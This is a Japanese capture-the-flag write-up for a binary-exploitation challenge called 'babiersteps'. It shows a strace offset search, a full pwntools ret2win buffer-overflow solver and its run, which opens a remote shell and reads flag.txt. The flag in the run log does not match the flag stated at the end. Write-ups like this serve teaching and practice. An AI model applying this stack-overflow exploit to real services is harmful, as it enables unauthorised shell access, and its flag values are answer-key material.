# babiersteps

## solution

straceで、Aが何個目でスタックフレームのrbp前まで影響あるかを調べると120でした。

```bash
$ python3 -c 'print("A"*119)' | strace -i ./babiersteps
[00007f9a88959002] read(0, "A", 1)      = 1
[00007f9a88959002] read(0, "\n", 1)     = 1
[00007f9a8892e176] exit_group(0)        = ?
[????????????????] +++ exited with 0 +++

$  python3 -c 'print("A"*120)' | strace -i ./babiersteps
[00007f1abd388002] read(0, "A", 1)      = 1
[00007f1abd388002] read(0, "\n", 1)     = 1
[00007f1abd38813b] lseek(0, -1, SEEK_CUR) = -1 ESPIPE (Illegal seek)
[00007f1abd3880a7] write(1, "Everyone has heard of gets, but "..., 56Everyone has heard of gets, but have you heard of scanf?) = 56
[00007f1abd3880a7] write(1, "\n", 1
)    = 1
[00007f1abd388002] read(0, "", 1)       = 0
[00007ffe207711a0] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x7ffe207711a0} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
```

8byteでアラインメントするために、今回はROP.find_gadgetによって'ret'命令のアドレスを取得しました。

また、`win()` で/bin/shを起動しているので、リターンアドレスでfunのアドレスを格納します。
```
004011c9  int64_t win()
004011c9  {
004011e9      return execve("/bin/sh", 0, 0);
004011d1  }
```

以上から以下のソルバーを作りました。

```python
from pwn import *

binfile = "./babiersteps"
context.binary = binfile
elf = ELF(binfile)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

win = elf.symbols['win']
print(win)
HOST='challenge.nahamcon.com'
PORT=32589

# conn = process(binfile)
conn = remote(HOST, PORT)
conn.recvuntil('Everyone has heard of gets, but have you heard of scanf?')

# padding + ret(8byte, allignment) + fun(=/bin/sh)
payload = b'a' * 120 + p64(ret) + p64(win)

conn.sendline(payload)
conn.interactive()
```


```
python3 solver.py
[*] '/babiersteps'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './babiersteps'
[+] Opening connection to challenge.nahamcon.com on port 32589: Done
solver.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil('Everyone has heard of gets, but have you heard of scanf?')
[*] Switching to interactive mode

$ ls
babiersteps
bin
dev
etc
flag.txt
lib
lib32
lib64
libx32
usr
$ cat flag.txt
flag{4dc0a785da36bfcf0e597917b9144fd6}
[*] Got EOF while reading in interactive
```


## FLAG

```
flag{75d68026-2e80-40f9-b39a-1ac44efb32dc}
```
